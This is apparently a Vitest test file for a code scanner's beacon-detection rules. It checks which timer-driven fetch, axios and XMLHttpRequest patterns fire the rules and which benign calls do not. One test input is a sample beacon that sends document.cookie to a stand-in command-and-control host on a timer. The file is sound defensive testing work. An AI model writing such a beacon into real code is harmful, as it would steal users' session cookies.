import { describe, expect, it } from "vitest";
import * as patterns from "../patterns.js";
import {
  ALL_PATTERN_SETS,
  isPatternApplicableToFile,
  matchPatternInContent,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS
    .flatMap(([, set]) => set)
    .find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

const regexOnly = (entry: PatternEntry): PatternEntry => ({
  ...entry,
  correlatedMatcher: undefined,
});

/** The scanner runs the beacon set with "gi"; check matcher and pattern string. */
function lines(rule: string, content: string): { matcher: number[]; regex: number[] } {
  const entry = shippedRule(rule);
  return {
    matcher: matchPatternInContent(entry, content, "gi").map((hit) => hit.line),
    regex: matchPatternInContent(regexOnly(entry), content, "gi").map((hit) => hit.line),
  };
}

describe("beacon rules require a transport call, not an identifier prefix", () => {
  it.each([
    ["BEACON_INTERVAL_FETCH", "setInterval(fetchNotifications, 30000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(forgotPassword, 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(refetchAxiosless, 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => forgot(user), 1000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => prefetch(route), 1000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(fetchNotifications, 30000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(forgotPassword, 1000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => showForgot(), gotoDelay);"],
  ])("%s ignores %s", (rule, content) => {
    expect(lines(rule, content)).toEqual({ matcher: [], regex: [] });
  });

  it.each([
    [
      "BEACON_INTERVAL_FETCH",
      'setInterval(() => fetch("https://c2.example/b?d=" + btoa(document.cookie)), 30000);',
    ],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => axios.post(u, data), 5000);"],
    ["BEACON_TIMEOUT_FETCH", "setTimeout(() => axios({ url: u, data }), 5000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => got.post(u, { json: data }), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => https.get(u, cb), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => window.fetch(u), 60000);"],
    ["BEACON_INTERVAL_FETCH", "setInterval(() => { const x = new XMLHttpRequest(); x.open('GET', u); x.send(); }, 9000);"],
    ["BEACON_TIMEOUT_FETCH", "SETTIMEOUT(() => AXIOS(url), 1)"],
  ])("%s still fires on %s", (rule, content) => {
    expect(lines(rule, content)).toEqual({ matcher: [1], regex: [1] });
  });

  it("gives both beacon rules one shared notFilePattern constant", () => {
    const shared = (patterns as Record<string, unknown>).BEACON_NOT_FILE_PATTERN;
    expect(shared).toBeInstanceOf(RegExp);
    expect(shippedRule("BEACON_INTERVAL_FETCH").notFilePattern).toBe(shared);
    expect(shippedRule("BEACON_TIMEOUT_FETCH").notFilePattern).toBe(shared);
  });

  it("skips minified vendored files for the timeout variant as for its twin", () => {
    const content = "setTimeout(function(){fetch(u)},0)";
    for (const rule of ["BEACON_INTERVAL_FETCH", "BEACON_TIMEOUT_FETCH"]) {
      expect(isPatternApplicableToFile(shippedRule(rule), content, "vendor/ui.min.js"), rule)
        .toBe(false);
      expect(isPatternApplicableToFile(shippedRule(rule), content, "src/poll.js"), rule)
        .toBe(true);
    }
  });
});
